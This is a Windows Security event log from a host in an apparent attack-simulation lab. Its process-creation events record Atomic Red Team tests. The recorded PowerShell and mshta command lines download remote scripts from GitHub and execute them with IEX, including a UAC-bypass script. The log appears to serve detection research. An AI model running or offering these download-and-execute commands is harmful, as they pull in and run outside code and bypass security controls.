Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382178
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Source Address:		::
	Source Port:		55124
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:37 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382217
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		8860
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55126
	Destination Address:	185.199.110.133
	Destination Port:		443
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:37 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382216
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		8860
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55126
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:37 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382215
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59598
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:37 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382214
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x229c
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x22b0
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	Powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:37 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382213
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x22b0
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:37 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382212
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1014
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:53:37 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382211
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		63816
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382227
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2220
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1c8c
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"  -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382226
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1c8c
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX"" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382225
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x12ec
	Process Name:	C:\Windows\System32\cmd.exe
	Exit Status:	0x0
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382224
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x2100
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382223
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		8448
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55127
	Destination Address:	185.199.110.133
	Destination Port:		443
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382222
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		8448
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55127
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382221
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2100
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x12ec
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	powershell.exe  -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382220
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x12ec
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382219
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x22b0
	Process Name:	C:\Windows\System32\cmd.exe
	Exit Status:	0x1
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382218
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x229c
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x1
03/01/2021 10:53:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382236
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4224
	Application Name:	\device\harddiskvolume1\windows\system32\mshta.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55129
	Destination Address:	185.199.110.133
	Destination Port:		443
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382235
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		4224
	Application Name:	\device\harddiskvolume1\windows\system32\mshta.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55129
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382234
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1080
	New Process Name:	C:\Windows\System32\mshta.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0xa98
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	mshta.exe  javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close() 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382233
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xa98
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0xcc4
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\system32\cmd.exe  /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382232
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xcc4
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382231
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1c8c
	Process Name:	C:\Windows\System32\cmd.exe
	Exit Status:	0x1
03/01/2021 10:53:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382230
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x2220
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x1
03/01/2021 10:53:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382229
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		8736
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55128
	Destination Address:	185.199.110.133
	Destination Port:		443
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382228
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		8736
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55128
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382239
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59340
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382238
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55130
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382237
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55130
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382240
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60612
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:44 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382241
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60319
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382243
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55131
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
